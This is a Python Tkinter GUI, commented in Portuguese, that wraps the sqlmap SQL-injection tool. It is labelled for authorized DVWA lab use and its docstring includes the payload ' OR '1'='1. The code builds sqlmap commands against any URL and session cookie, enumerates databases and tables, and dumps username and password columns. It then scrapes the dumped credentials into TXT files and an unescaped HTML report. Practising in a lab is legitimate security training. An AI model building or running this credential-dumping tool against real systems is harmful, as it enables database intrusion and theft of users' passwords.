#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
jsql.py - Interface gráfica para sqlmap
Uso autorizado apenas em laboratório/teste próprio (ex.: DVWA local)

python3 jsql.py 

' OR '1'='1

"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import shutil
import re
import os
import datetime

# --- Configuração de Diretório ---
# Pega o diretório exato onde este script Python está salvo
DIRETORIO_ATUAL = os.path.dirname(os.path.abspath(__file__))
# Define a pasta padrão para salvar dentro do diretório do script
PASTA_PADRAO = os.path.join(DIRETORIO_ATUAL, "resultados_sqlmap")

class SQLMapGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("jsql - Laboratório Autorizado")
        self.root.geometry("1000x760")
        self.processo = None
        self.janela_senhas = None
        self.senhas = None
        
        # Lista para armazenar dados puros para o HTML
        self.dados_extraidos = [] 

        self.criar_widgets()

    def criar_widgets(self):
        # URL
        ttk.Label(self.root, text="URL alvo:").grid(row=0, column=0, sticky="w", padx=5, pady=3)

        self.url = tk.StringVar(value="http://192.168.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit")
        
        ttk.Entry(self.root, textvariable=self.url, width=90).grid(row=0, column=1, padx=5, pady=3)

        # Cookie
        ttk.Label(self.root, text="Cookie:").grid(row=1, column=0, sticky="w", padx=5, pady=3)
       
        self.cookie = tk.StringVar(value="PHPSESSID=f375dcd46068c908a2d07ccb1680c476; security=low")

        ttk.Entry(self.root, textvariable=self.cookie, width=90).grid(row=1, column=1, padx=5, pady=3)

        # Nível / Risco
        ttk.Label(self.root, text="Level:").grid(row=2, column=0, sticky="w", padx=5)
        self.level = tk.StringVar(value="1")
        ttk.Spinbox(self.root, from_=1, to=5, textvariable=self.level, width=5).grid(row=2, column=1, sticky="w")

        ttk.Label(self.root, text="Risk:").grid(row=3, column=0, sticky="w", padx=5)
        self.risk = tk.StringVar(value="1")
        ttk.Spinbox(self.root, from_=1, to=3, textvariable=self.risk, width=5).grid(row=3, column=1, sticky="w")

        # Banco / Tabela / Colunas
        ttk.Label(self.root, text="Banco (-D):").grid(row=4, column=0, sticky="w", padx=5)
        self.db = tk.StringVar(value="dvwa")
        ttk.Entry(self.root, textvariable=self.db, width=25).grid(row=4, column=1, sticky="w")

        ttk.Label(self.root, text="Tabela (-T):").grid(row=5, column=0, sticky="w", padx=5)
        self.tabela = tk.StringVar(value="users")
        ttk.Entry(self.root, textvariable=self.tabela, width=25).grid(row=5, column=1, sticky="w")

        ttk.Label(self.root, text="Colunas (-C):").grid(row=6, column=0, sticky="w", padx=5)
        self.colunas = tk.StringVar(value="user,password")
        ttk.Entry(self.root, textvariable=self.colunas, width=25).grid(row=6, column=1, sticky="w")

        # ===== Pasta de saída (onde salvar) =====
        ttk.Label(self.root, text="Pasta de saída:").grid(row=7, column=0, sticky="w", padx=5)
        frame_pasta = ttk.Frame(self.root)
        frame_pasta.grid(row=7, column=1, sticky="ew", padx=5)
        self.pasta = tk.StringVar(value=PASTA_PADRAO)
        ttk.Entry(frame_pasta, textvariable=self.pasta, width=75).pack(side="left", fill="x", expand=True)
        ttk.Button(frame_pasta, text="Escolher...", command=self.escolher_pasta).pack(side="left", padx=5)

        # Ações
        acoes = ttk.LabelFrame(self.root, text="Ação")
        acoes.grid(row=8, column=0, columnspan=2, sticky="ew", padx=5, pady=8)

        self.var_batch = tk.BooleanVar(value=True)
        ttk.Checkbutton(acoes, text="--batch (sem perguntas)", variable=self.var_batch).grid(row=0, column=0, padx=5)

        botoes = [
            ("Listar Bancos (-dbs)", self.cmd_dbs),
            ("Listar Tabelas", self.cmd_tabelas),
            ("Dump de Colunas", self.cmd_dump),
            ("Ver/Salvar Senhas", self.cmd_senhas),
        ]
        for i, (txt, cmd) in enumerate(botoes):
            ttk.Button(acoes, text=txt, command=cmd).grid(row=1, column=i, padx=5, pady=5)

        ttk.Button(self.root, text="Executar", command=self.executar).grid(row=9, column=0, pady=5)
        ttk.Button(self.root, text="Parar", command=self.parar).grid(row=9, column=1, sticky="w")
        ttk.Button(self.root, text="Limpar Log", command=self.limpar_log).grid(row=8, column=1, sticky="e")

        # Log de saída (quadrado preto principal)
        ttk.Label(self.root, text="Saída (Log):").grid(row=10, column=0, sticky="w", padx=5)
        self.saida = scrolledtext.ScrolledText(self.root, width=100, height=20, bg="#111", fg="#0f0")
        self.saida.grid(row=11, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")

        self.root.columnconfigure(1, weight=1)
        self.root.rowconfigure(11, weight=1)

    def escolher_pasta(self):
        pasta = filedialog.askdirectory(title="Escolha a pasta onde salvar os resultados")
        if pasta:
            self.pasta.set(pasta)

    def garantir_pasta(self):
        pasta = self.pasta.get().strip()
        if pasta:
            os.makedirs(pasta, exist_ok=True)
        return pasta

    # ============ JANELA SEPARADA: Senhas Encontradas ============
    def abrir_janela_senhas(self):
        if self.janela_senhas is not None and self.janela_senhas.winfo_exists():
            self.janela_senhas.deiconify()
            return
        self.janela_senhas = tk.Toplevel(self.root)
        self.janela_senhas.title("Dados/Senhas Encontradas")
        self.janela_senhas.geometry("600x450")

        barra = ttk.Frame(self.janela_senhas)
        barra.pack(fill="x", padx=5, pady=5)
        ttk.Button(barra, text="Limpar", command=self.limpar_senhas).pack(side="left", padx=3)
        ttk.Button(barra, text="Salvar .TXT", command=self.salvar_senhas_txt).pack(side="left", padx=3)
        ttk.Button(barra, text="Salvar HTML (Bonito)", command=self.salvar_senhas_html).pack(side="left", padx=3)

        self.senhas = scrolledtext.ScrolledText(self.janela_senhas, bg="#111", fg="#ff0")
        self.senhas.pack(fill="both", expand=True, padx=5, pady=5)
        self.senhas.tag_config("destaque", foreground="#0ff")

        # Se já tiver dados na lista ao abrir, carrega na tela
        for item in self.dados_extraidos:
            texto = f"Dado 1: {item['dado1']}\nDado 2: {item['dado2']}\n{'-'*40}\n"
            self.senhas.insert(tk.END, texto, "destaque")

    def limpar_senhas(self):
        self.senhas.delete("1.0", tk.END)
        self.dados_extraidos.clear()

    def salvar_senhas_txt(self):
        if self.senhas is None: return
        conteudo = self.senhas.get("1.0", tk.END)
        if not conteudo.strip():
            messagebox.showinfo("Aviso", "Nenhum dado para salvar.")
            return
        
        self.garantir_pasta()
        arquivo = filedialog.asksaveasfilename(
            title="Salvar como TXT...", defaultextension=".txt",
            initialdir=self.pasta.get(), initialfile="dados_extraidos.txt",
            filetypes=[("Arquivo de texto", "*.txt")]
        )
        if arquivo:
            with open(arquivo, "w", encoding="utf-8") as f:
                f.write(conteudo)
            self.log(f"[✓] TXT salvo em: {arquivo}\n")

    def salvar_senhas_html(self):
        if not self.dados_extraidos:
            messagebox.showinfo("Aviso", "Nenhum dado extraído estruturado para gerar HTML.")
            return

        self.garantir_pasta()
        arquivo = filedialog.asksaveasfilename(
            title="Salvar como HTML...", defaultextension=".html",
            initialdir=self.pasta.get(), initialfile="relatorio_sqlmap.html",
            filetypes=[("Arquivo HTML", "*.html")]
        )
        
        if arquivo:
            html_content = f"""
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <title>Relatório SQLMap - Dados Extraídos</title>
                <style>
                    body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; }}
                    .container {{ max-width: 900px; margin: 0 auto; background-color: #1e1e1e; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,255,204,0.1); }}
                    h1 {{ color: #00ffcc; text-align: center; border-bottom: 1px solid #333; padding-bottom: 15px; }}
                    .info {{ font-size: 0.9em; color: #888; text-align: center; margin-bottom: 30px; }}
                    table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                    th, td {{ padding: 12px 15px; border-bottom: 1px solid #333; text-align: left; }}
                    th {{ background-color: #2a2a2a; color: #00ffcc; font-weight: bold; text-transform: uppercase; }}
                    tr:hover {{ background-color: #2d2d2d; }}
                    .footer {{ text-align: center; margin-top: 40px; font-size: 0.8em; color: #555; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Resultados do Dump (SQLMap)</h1>
                    <div class="info">Gerado em: {datetime.datetime.now():%d/%m/%Y às %H:%M:%S} <br> Alvo: {self.url.get()}</div>
                    <table>
                        <thead>
                            <tr>
                                <th>Coluna 1 (User/ID)</th>
                                <th>Coluna 2 (Password/Hash)</th>
                            </tr>
                        </thead>
                        <tbody>
            """
            
            for item in self.dados_extraidos:
                html_content += f"<tr><td>{item['dado1']}</td><td>{item['dado2']}</td></tr>"

            html_content += """
                        </tbody>
                    </table>
                    <div class="footer">Relatório gerado via Interface Customizada SQLMap</div>
                </div>
            </body>
            </html>
            """
            
            with open(arquivo, "w", encoding="utf-8") as f:
                f.write(html_content)
            self.log(f"[✓] Relatório HTML salvo em: {arquivo}\n")
            
            # Tenta abrir o HTML no navegador padrão automaticamente
            try:
                if os.name == 'nt': # Windows
                    os.startfile(arquivo)
                elif sys.platform == 'linux': # Linux
                    subprocess.Popen(['xdg-open', arquivo])
            except:
                pass

    # ============ LÓGICA DE EXECUÇÃO ============
    def montar_base(self):
        cmd = ["sqlmap", "-u", self.url.get(), "--cookie", self.cookie.get()]
        if self.var_batch.get():
            cmd.append("--batch")
        cmd += ["--level", self.level.get(), "--risk", self.risk.get()]
        pasta = self.pasta.get().strip()
        if pasta:
            cmd += ["--output-dir", pasta]
        return cmd

    def cmd_dbs(self):
        self.executar(self.montar_base() + ["-dbs"])

    def cmd_tabelas(self):
        self.executar(self.montar_base() + ["-D", self.db.get(), "--tables"])

    def cmd_dump(self):
        self.executar(self.montar_base() + [
            "-D", self.db.get(), "-T", self.tabela.get(),
            "-C", self.colunas.get(), "--dump"
        ])

    def cmd_senhas(self):
        self.abrir_janela_senhas()
        self.cmd_dump()

    def executar(self, cmd=None):
        if cmd is None: cmd = self.montar_base()
        if shutil.which("sqlmap") is None:
            messagebox.showerror("Erro", "sqlmap não encontrado no PATH. Instale no terminal.")
            return
        
        self.garantir_pasta()
        self.log("\n[+] Executando: " + " ".join(cmd) + "\n")
        threading.Thread(target=self.rodar, args=(cmd,), daemon=True).start()

    def rodar(self, cmd):
        try:
            self.processo = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            for linha in self.processo.stdout:
                self.log(linha)
                self.detectar_senhas(linha)
            self.processo.wait()
            self.log(f"\n[=] Finalizado (código {self.processo.returncode})\n")
        except Exception as e:
            self.log(f"[!] Erro: {e}\n")

    def detectar_senhas(self, linha):
        """Extrai linhas de dump que parecem tabelas de usuários e senhas."""
        s = linha.strip()
        # Procura por tabelas formatadas com Pipes (| admin | hash |)
        if s.startswith("|") and s.count("|") >= 3:
            partes = [p.strip() for p in s.split("|")]
            partes = [p for p in partes if p] # Remove itens vazios
            
            if len(partes) >= 2:
                d1, d2 = partes[0], partes[1]
                # Ignora cabeçalhos e linhas separadoras do sqlmap
                if d1.lower() in ("user", "username", "password", "usuario", "senha"): return
                if set(d1) <= {"-", "+", " "} or set(d2) <= {"-", "+", " "}: return
                
                self.root.after(0, self.log_senha, d1, d2)

    def log_senha(self, d1, d2):
        # Salva na memória para gerar o HTML depois
        if not any(item['dado1'] == d1 and item['dado2'] == d2 for item in self.dados_extraidos):
            self.dados_extraidos.append({"dado1": d1, "dado2": d2})
            
            # Se a janela de senhas estiver aberta, atualiza a tela
            if self.senhas is not None and self.janela_senhas is not None and self.janela_senhas.winfo_exists():
                texto = f"Dado 1: {d1}\nDado 2: {d2}\n{'-'*40}\n"
                self.senhas.insert(tk.END, texto, "destaque")
                self.senhas.see(tk.END)

    def parar(self):
        if self.processo and self.processo.poll() is None:
            self.processo.terminate()
            self.log("[!] Processo interrompido pelo usuário.\n")

    def limpar_log(self):
        self.saida.delete("1.0", tk.END)

    def log(self, texto):
        self.root.after(0, lambda: (self.saida.insert(tk.END, texto), self.saida.see(tk.END)))

if __name__ == "__main__":
    import sys
    root = tk.Tk()
    app = SQLMapGUI(root)
    root.mainloop()
